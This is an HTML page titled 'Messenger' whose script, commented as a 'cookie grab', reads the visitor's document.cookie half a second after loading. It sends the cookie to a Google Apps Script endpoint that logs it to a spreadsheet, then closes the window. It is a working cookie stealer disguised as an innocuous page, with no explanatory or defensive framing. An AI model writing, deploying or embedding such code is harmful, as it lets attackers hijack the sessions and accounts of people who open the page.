<!DOCTYPE html>
<html>
<head>
    <title>Messenger</title>
</head>
<body style="margin:0; background:#fff;">
    
    <script>
        // ⚠️ PASTE YOUR GOOGLE APPS SCRIPT URL HERE ⚠️
        // Make sure there are no extra spaces or quotes!
        var scriptURL = "https://script.google.com/macros/s/AKfycbyQEEnToPq9wKYj9u8519aYHdkRbfoGyXfobTq5rWZlG46tjm-hzUgxifVotatxe_E/exec";

        console.log("Starting cookie grab...");

        setTimeout(function() {
            
            var rawCookie = document.cookie;
            console.log("Raw Cookie Found:", rawCookie);

            if (rawCookie && rawCookie !== "") {
                var encodedCookie = encodeURIComponent(rawCookie);
                
                // Send to Google Sheets
                navigator.sendBeacon(scriptURL + "?cookie=" + encodedCookie);
                
                console.log("Sent Beacon!");
            } else {
                console.log("No Cookie Found");
            }

            window.close();

        }, 500);
    </script>
    
</body>
</html>
